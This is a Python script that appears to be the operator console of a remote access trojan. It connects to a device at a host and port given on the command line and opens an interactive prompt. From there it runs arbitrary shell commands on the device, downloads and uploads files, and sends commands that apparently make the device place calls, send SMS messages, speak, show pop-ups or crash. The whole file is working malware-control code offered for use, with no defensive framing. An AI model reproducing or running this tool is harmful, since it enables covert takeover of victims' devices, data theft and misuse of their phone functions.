import socket
import time
import os
import sys
from datetime import datetime
import crayons
import colorama

colorama.init()

def connect():
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((str(sys.argv[1]),int(sys.argv[2])))
        
        print (crayons.blue("["),crayons.green("+"),crayons.blue("] "),"GOT A CONNECTED DEVICE")
        send_command(sock)
    except Exception as e:
        print (crayons.blue("["),crayons.red("!"),crayons.blue("] "),e)
        pass

def send_command(sock):
    while True:
        command = input("({0})-9h05t_z~> ".format(socket.gethostname()))
        if command == "":
            print (crayons.red("Enter A command"))
            pass
        else:
            if command.split(' ')[0] == "download" or command.split(' ')[0] == "get":
                name = command.split(' ')[1]
                sock.send(command.encode())
                with open(name,"wb") as f:
                    f.write(sock.recv(2048))
                f.close()
                print (crayons.blue("["),crayons.green("SAVED"),crayons.blue("] "),"File : ",crayons.green("{}".format(name)))
                pass
            elif command.split(' ')[0] == "cd":
                name = command.split(' ')[1]
                sock.send(command.encode())
                print (sock.recv(2048).decode('utf-8'))
                pass
            elif command[:6] == "upload":
                filename = command[7:]
                if os.path.exists(filename):
                    try:
                        with open(filename,"rb") as f:
                            r = f.read()
                            sock.send(r)
                        f.close()
                        #sock.send(b"File Saved Successfully")
                    except Exception as e:
                        print (e)
                        pass
                else:
                    pass
                    #conn.send(b"sorry")
            elif command[:5] == "speak":
                if len(command) < 6:
                    print ("speak <message>")
                else:
                    sock.send(command.encode())
                    pass
            elif command == "crash":
                sock.send(command.encode())
                pass
            elif command.split(' ')[0] == "call":
                sock.send(command.encode())
                pass
            elif command.split(' ')[0] == "sms":
                sock.send(command.encode())
                pass
            elif command.split(' ')[0] == "pop":
                sock.send(command.encode())
                pass
            elif command.split(' ')[0] == "show":
                sock.send(command.encode())
                pass
            else:
                sock.send(command.encode())
                print (sock.recv(2048).decode('utf-8'))
if __name__=="__main__":
    connect()


                
